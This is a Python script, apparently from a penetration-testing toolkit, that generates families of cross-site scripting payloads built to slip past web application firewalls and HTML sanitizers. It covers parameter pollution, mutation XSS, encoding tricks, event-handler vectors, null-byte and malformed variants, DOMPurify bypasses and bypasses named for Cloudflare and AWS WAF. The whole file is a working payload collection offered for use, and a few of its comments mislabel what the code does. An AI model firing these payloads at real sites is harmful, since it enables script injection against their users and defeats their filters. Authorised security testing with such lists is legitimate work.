#!/usr/bin/env python3
"""
Advanced XSS Bypass Techniques
Modern WAF bypass methods: HPP, mXSS, encoding, alternative vectors
"""

import argparse
import json
import re
from textwrap import dedent
from urllib.parse import quote


class HPPBypass:
    """HTTP Parameter Pollution bypass techniques.
    
    HPP exploits how WAFs and backends handle duplicate parameters differently.
    WAF might see only first/last, backend concatenates all.
    """
    
    def split_payload(self, param: str, payload: str) -> list:
        """Split XSS payload across multiple same-named params."""
        return [
            f"{param}=1'",
            f"{param}={payload}",
            f"{param}="
        ]
    
    def generate_hpp_payloads(self, payload: str) -> list:
        """Generate HPP variants of a payload."""
        encoded = payload.replace("'", "%27")
        return [
            f"1'&{payload}&q=",
            f"q=1'&{payload}&q=",
            f"q=1%27&{encoded}&q=",
            f"q=1%27&amp;{payload}&q=",
            # ASP.NET style (joins with comma)
            f"q=1',{payload},'",
            f"q=x&q={payload}&q=",
        ]


class MutationXSS:
    """Mutation XSS (mXSS) - sanitizer parser differences.
    
    These work because sanitizers parse HTML differently than browsers.
    The same HTML can mutate into executable code when re-parsed.
    """
    
    def get_mxss_payloads(self) -> list:
        """Get mutation XSS payloads that exploit parser differences."""
        return [
            # XML Processing Instruction bypass
            '<?xml-stylesheet type="text/xsl"?><img src="x" onerror="alert(1)">>',
            # noscript mutation (classic)
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            # SVG namespace mutation
            '<svg><style><img src=x onerror=alert(1)></style></svg>',
            # MathML mutation
            '<math><maction actiontype="statusline#http://evil">X</maction></math>',
            # form nesting mutation
            '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
            # SVG foreignObject mutation
            '<svg><foreignObject><img src=x onerror="alert(1)"></foreignObject></svg>',
            # CDATA section
            '<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>',
            # Math annotation-xml
            '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
        ]


class EncodingBypass:
    """Payload encoding and obfuscation techniques.
    
    Various encoding methods to evade signature-based detection.
    """
    
    def string_fromcharcode(self, payload: str) -> str:
        """Convert payload to String.fromCharCode calls."""
        codes = ",".join(str(ord(c)) for c in payload)
        return f"String.fromCharCode({codes})"
    
    def html_entity_encode(self, payload: str) -> str:
        """Encode payload as HTML entities."""
        encoded = ""
        for c in payload:
            encoded += f"&#x{ord(c):x};"
        return encoded
    
    def decimal_html_encode(self, payload: str) -> str:
        """Encode payload as decimal HTML entities."""
        encoded = ""
        for c in payload:
            encoded += f"&#{ord(c)};"
        return encoded
    
    def url_double_encode(self, payload: str) -> str:
        """Double URL encode the payload."""
        return quote(quote(payload))
    
    def unicode_variants(self, payload: str) -> list:
        """Generate Unicode obfuscation variants."""
        return [
            # Fullwidth Unicode (looks like normal chars)
            payload.replace("a", "\ufe44").replace("s", "\uff53"),
            # Various Unicode escapes
            payload.replace("<", "\\u003c").replace(">", "\\u003e"),
            payload.replace("<", "&#60;").replace(">", "&#62;"),
        ]
    
    def get_encoding_payloads(self, payload: str) -> list:
        """Generate all encoding variants of a payload."""
        return [
            self.html_entity_encode(payload),
            self.decimal_html_encode(payload),
            self.url_double_encode(payload),
            self.string_fromcharcode(payload),
            # Mixed encoding
            payload.replace("<", "%3C").replace(">", "%3E"),
            payload.replace("<", "&#x3c").replace(">", "&#x3e"),
            # Overlong UTF-8 (historical but sometimes works)
        ]


class AlternativeVectors:
    """Non-script tag XSS vectors.
    
    Alternative HTML elements and event handlers that execute JS.
    """
    
    def get_vectors(self) -> list:
        """Get all alternative XSS vectors."""
        vectors = [
            # SVG-based (very effective against sanitizers)
            '<svg onload=alert(1)>',
            '<svg><script>alert(1)</script></svg>',
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
            '<svg/onload=alert(1)>',
            '<svg><set attributeName=onmouseover to=alert(1)>',
            '<svg><a><animate attributeName=href to=javascript:alert(1)><text y=20>click</text></a></svg>',
            
            # MathML (often missed by sanitizers)
            '<math><maction actiontype="statusline#http://evil">X</maction></math>',
            '<math><mglyph><style></math><img src=x onerror=alert(1)>',
            
            # HTML5 events (requires user interaction or auto-fire)
            '<input onfocus=alert(1) autofocus>',
            '<input onblur=alert(1) autofocus><input autofocus>',
            '<select onfocus=alert(1) autofocus>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<body onload=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<iframe srcdoc=<svg onload=alert(1)>>',
            
            # Details/summary (toggle-based)
            '<details open ontoggle=alert(1)>',
            
            # Template injection
            '<template><img src=x onerror=alert(1)></template>',
            
            # Object/embed (legacy but sometimes works)
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            
            # Animations (SVG)
            '<svg><animate onanimationend=alert(1) attributeName=x dur=1s>',
            
            # Transitions (CSS)
            '<style>@keyframes x{from{width:0}to{width:100%}}</style><div style="animation:x 1s" onanimationend="alert(1)"></div>',
            
            # ARIA (often overlooked)
            '<div role="img" aria-label="&lt;img src=x onerror=alert(1)&gt;">',
            
            # Meta refresh (no interaction needed)
            '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
            
            # Base tag hijacking
            '<base href="javascript:alert(1)//">',
            
            # SVG use element
            '<svg><use href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjx0aXRsZT5YWFN4PC90aXRsZT48c3R5bGU+Ym9ke2NvbnRlbnQ6IG5vbmU7fTwvc3R5bGU+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg=="/>',
        ]
        return vectors


class MalformedBypass:
    """Bypass using malformed attributes and null bytes.
    
    Exploits WAF parsing inconsistencies with malformed/mutilated HTML.
    """
    
    def get_malformed_payloads(self) -> list:
        """Get malformed/mutilated bypass payloads."""
        return [
            # Double-quote escapes
            '"><svg/onload=alert(1)>',
            '"><img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            
            # Backslash escapes
            '\\"><script>alert(1)</script>',
            '><script>alert(1)</script>',
            
            # Null byte injection
            '><svg+onload+%00+alert(1)>',
            '"><img src=x onerror=alert(1) %00>',
            
            # Tab separation (WAF might not handle tabs)
            '><svg\tonload=alert(1)>',
            '<img\tsrc=x\tonerror=alert(1)>',
            
            # Newline/multi-line
            '><svg\nonload=alert(1)>',
            
            # Multi-attribute without spaces
            '"><svg/onload=alert(1)onload=alert(2)>',
            
            # Capitalization variants
            '"><SVG ONLOAD=alert(1)>',
            '"><ScRiPt>alert(1)</ScRiPt>',
            
            # Mixed case with special chars
            '"><sVg/oNlOaD=alert(1)>',
        ]
    
    def generate_mutation_pairs(self, payload: str) -> list:
        """Generate mutation pairs for fuzzing."""
        mutations = [
            (payload, "normal"),
            (payload.upper(), "upper"),
            (payload.lower(), "lower"),
            (payload.capitalize(), "capitalized"),
        ]
        
        # Add null bytes at various positions
        for i in range(len(payload) + 1):
            mutated = payload[:i] + "\x00" + payload[i:]
            mutations.append((mutated, f"nullbyte_{i}"))
        
        return mutations


class DOMPurifyBypass:
    """Specific DOMPurify bypass techniques.
    
    Targets known DOMPurify vulnerabilities and parser quirks.
    """
    
    def get_dompurify_bypasses(self) -> list:
        """Get payloads known to bypass DOMPurify (varies by version)."""
        return [
            # CVE-2024-45801 - Depth check bypass
            '<svg><math><style>' + '<img src=x onerror=alert(1)>' * 20 + '</style></math></svg>',
            
            # Namespace confusion
            '<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
            
            # noscript clobbering
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            
            # XML Processing Instructions
            '<?xml-stylesheet type="text/xsl"?><img src="x" onerror="alert(1)">>',
            
            # SVG animation with foreignObject
            '<svg><animate onbegin=alert(1) attributeName=x dur=1s><set attributeName=onmouseover to=alert(1)>',
            
            # Deep nesting (pre-3.1.3)
            '<div>' * 50 + '<img src=x onerror=alert(1)>' + '</div>' * 50,
        ]


class WAFBypass:
    """WAF-specific bypass techniques.
    
    Targets specific WAF products and their parsing quirks.
    """
    
    def get_waf_bypasses(self) -> dict:
        """Get WAF-specific bypass payloads."""
        return {
            # Cloudflare bypasses
            'cloudflare': [
                # Exceeding header limit
                'XSS' + '&' * 100 + '<svg onload=alert(1)>',
                # Mixed encoding
                '<svg' + '\n' * 1000 + 'onload=alert(1)>',
            ],
            
            # AWS WAF bypasses
            'aws': [
                # Double URL encoding
                '%253csvg%2520onload%253dalert(1)%253e',
                # Newlines in headers
                '><svg onload=alert(1)><!--' + '\n' * 500 + '-->',
            ],
            
            # Generic (most WAFs)
            'generic': [
                # Comment injection
                '<!--><svg onload=alert(1)>-->',
                # Template literal
                '"><script>`alert(1)`</script>',
                # Async/await
                '"><script>eval(atob("YWxlcnQoMSk="))</script>',
            ],
        }


def get_all_bypass_payloads(base_payload: str = "<script>alert(1)</script>") -> dict:
    """Generate all bypass variants organized by category.
    
    Returns:
        dict: {category: [payloads]} for all bypass techniques
    """
    hp = HPPBypass()
    mx = MutationXSS()
    eb = EncodingBypass()
    av = AlternativeVectors()
    mb = MalformedBypass()
    db = DOMPurifyBypass()
    wb = WAFBypass()
    
    return {
        'hpp': hp.generate_hpp_payloads(base_payload),
        'mutation_xss': mx.get_mxss_payloads(),
        'encoding': eb.get_encoding_payloads(base_payload),
        'alternative_vectors': av.get_vectors(),
        'malformed': mb.get_malformed_payloads(),
        'dompurify': db.get_dompurify_bypasses(),
        'waf_specific': wb.get_waf_bypasses().get('generic', []),
    }


def build_arg_parser() -> argparse.ArgumentParser:
    return argparse.ArgumentParser(
        description="Generate advanced XSS bypass payload families for manual testing.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=dedent(
            """\
            Example:
              python3 agents/xss_bypasses_advanced.py --category waf_specific --limit 5

            Output:
              Prints payloads to stdout only.
            """
        ),
    )


def main() -> int:
    parser = build_arg_parser()
    parser.add_argument(
        "--base-payload",
        default="<script>alert(1)</script>",
        help="Base payload used for HPP and encoding variants",
    )
    parser.add_argument(
        "--category",
        choices=[
            "hpp",
            "mutation_xss",
            "encoding",
            "alternative_vectors",
            "malformed",
            "dompurify",
            "waf_specific",
        ],
        help="Only print one payload category",
    )
    parser.add_argument(
        "--limit",
        type=int,
        default=3,
        help="Max payloads to print per category (default: 3)",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Print payloads as JSON instead of human-readable text",
    )
    args = parser.parse_args()

    all_payloads = get_all_bypass_payloads(args.base_payload)
    if args.category:
        all_payloads = {args.category: all_payloads[args.category]}

    if args.json:
        print(json.dumps(all_payloads, indent=2))
        return 0

    print("XSS Bypass Payloads Generated:")
    for category, payloads in all_payloads.items():
        limited = payloads[: max(args.limit, 0)]
        print(f"\n{category.upper()} ({len(payloads)} payloads):")
        for payload in limited:
            suffix = "..." if len(payload) > 60 else ""
            print(f"  - {payload[:60]}{suffix}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
